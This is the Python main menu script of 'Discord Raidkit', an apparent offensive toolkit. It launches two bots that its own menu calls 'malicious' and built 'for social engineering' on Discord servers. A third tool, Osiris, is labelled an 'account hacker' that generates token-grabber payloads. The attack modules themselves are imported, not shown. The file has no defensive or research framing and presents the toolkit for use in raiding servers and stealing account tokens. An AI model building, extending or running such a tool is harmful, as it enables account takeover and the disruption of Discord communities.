"""
Discord Raidkit v2.4.5
the-cult-of-integral

Last modified: 2023-11-04 21:38
"""

import asyncio.proactor_events as ape
import logging
import os
import pathlib

import colorama as cama
import discord
import nest_asyncio

import conf.config as conf
import tools.osiris as osiris
import tools.raider as rd
import ui.drui as drui
import utils.async_utils as au
import utils.dr_repo_utils as ru
import utils.io_utils as iou
import utils.log_utils as lu

nest_asyncio.apply()


def check_config_exists():
    return pathlib.Path(conf.DEF_CONFIG_FILE_PATH).exists()


def run_option(option_id: int) -> None:
    """Run the selected option from the main menu.

    Args:
        option_id (int): the option id to run

    Raises:
        SystemExit: exit the program if an unknown error is raised
    """
    if option_id in {1, 2}:
        logger = logging.getLogger('discord')
        logger.handlers = []
        cfg = conf.DRConfig()
        match option_id:
            case 1: 
                bot_type = rd.Anubis()
            case 2: 
                bot_type = rd.Qetesh()
        try:
            rd.Raider(bot_type, cfg).run(cfg['token'])
        except (discord.errors.HTTPException, discord.errors.LoginFailure):
            os.system('cls' if os.name == 'nt' else 'clear')
            lu.serror(f'Bot failed to login to Discord with token: {cfg["token"]}')
            print('Please check your Discord Bot token is correct and try again.\n')
            print('Enter anything to continue: ', end='')
            input()
        except discord.errors.PrivilegedIntentsRequired:
            os.system('cls' if os.name == 'nt' else 'clear')
            lu.serror('Bot failed to login to Discord due to missing privileged intents.')
            print('Please enable the following intents in the Discord Developer Portal\n')
            print('Enter anything to continue: ', end='')
            input()
        except Exception as e:
            lu.scritical(f'Bot failed to login to Discord with error: {e}')
            raise SystemExit
    elif option_id == 3:
        osiris.Osiris().run()
    elif option_id == 4:
        conf.DRConfig().prompt_config(False)

        
def main():
    """Run the main menu and run the selected option.
    """
    os.system('cls' if os.name == 'nt' else 'clear')
    ru.check_for_updates()
    opts = [
        iou.MenuOption('Anubis', 'A malicious Discord bot with a moderation command suite for social engineering', run_option, 1),
        iou.MenuOption('Qetesh', 'A malicious Discord bot with an NSFW command suite for social engineering', run_option, 2),
        iou.MenuOption('Osiris', 'A discord account hacker that can also generate token-grabber payloads', run_option, 3),
        iou.MenuOption('Edit Bot Config', 'Edit the configuration of Anubis/Qetesh', run_option, 4, condition=check_config_exists)]
    menu = iou.NumberedMenu(drui.DISCORD_RAIDKIT_ASCII, opts, False, cama.Fore.LIGHTBLUE_EX, cama.Fore.LIGHTCYAN_EX)
    menu.run()


if __name__ == '__main__':
    au.silence_event_loop_closed_exception(ape._ProactorBasePipeTransport.__del__)
    lu.init()
    cama.init()
    try:
        main()
    finally:
        cama.deinit()
